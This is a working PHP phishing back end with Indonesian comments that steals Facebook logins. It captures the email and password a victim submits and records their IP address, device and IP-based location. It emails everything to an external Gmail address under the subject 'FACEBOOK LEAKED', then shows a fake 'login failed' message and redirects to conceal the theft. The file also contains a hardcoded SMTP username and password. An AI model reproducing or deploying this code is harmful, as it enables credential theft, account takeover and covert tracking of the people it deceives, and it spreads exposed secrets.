<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/Exception.php';
require 'PHPMailer/PHPMailer.php';
require 'PHPMailer/SMTP.php';

// Tangkap data form
$email    = isset($_POST['email']) ? trim(htmlspecialchars($_POST['email'])) : '';
$password = isset($_POST['password']) ? trim(htmlspecialchars($_POST['password'])) : '';

// Tangkap IP dan Device Info
$ip_address = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

// Lokasi berdasarkan IP
$location_data = @json_decode(@file_get_contents("http://ip-api.com/json/{$ip_address}"));
$country   = $location_data->country ?? 'Unknown';
$region    = $location_data->regionName ?? 'Unknown';
$city      = $location_data->city ?? 'Unknown';
$isp       = $location_data->isp ?? 'Unknown';

// Proses kirim email
if ($_SERVER["REQUEST_METHOD"] == "POST" && !empty($email) && !empty($password)) {
    $mail = new PHPMailer(true);

    try {
        // Konfigurasi SMTP
        $mail->isSMTP();
        $mail->Host       = 'kemiri.iixcp.rumahweb.net'; // SMTP Host Rumahweb
        $mail->SMTPAuth   = true;
        $mail->Username   = 'kinara@topterpercaya.my.id'; // Email pengirim
        $mail->Password   = 'Jakarta@1337'; // Password email pengirim
        $mail->SMTPSecure = 'ssl'; // SSL encryption
        $mail->Port       = 465; // Port untuk SSL

        $mail->setFrom('kinara@topterpercaya.my.id', 'Kinara');
        $mail->addAddress('spamming.karran@gmail.com'); // Ganti dengan alamat email tujuan

        $mail->isHTML(true);
        $mail->Subject = 'FACEBOOK LEAKED';
        $mail->Body    = "
            <h3>Facebook Data Leak by Kinara</h3>
            <p><strong>Email:</strong> {$email}</p>
            <p><strong>Password:</strong> {$password}</p>
            <p><strong>IP Address:</strong> {$ip_address}</p>
            <p><strong>Device:</strong> {$user_agent}</p>
            <p><strong>Lokasi:</strong> {$city}, {$region}, {$country}</p>
            <p><strong>ISP:</strong> {$isp}</p>
            <hr>
            <p>Dikirim via Kinara by @KarranWang (Auto-notify)</p>
        ";

        $mail->send();

        echo "<script>
            alert('Login gagal. Silakan coba lagi.');
            window.location.href = 'gin.php'; // Mengalihkan ke halaman login
        </script>";

    } catch (Exception $e) {
        echo "<p style='color:red'>Gagal mengirim email. Error: {$mail->ErrorInfo}</p>";
    }
}
?>
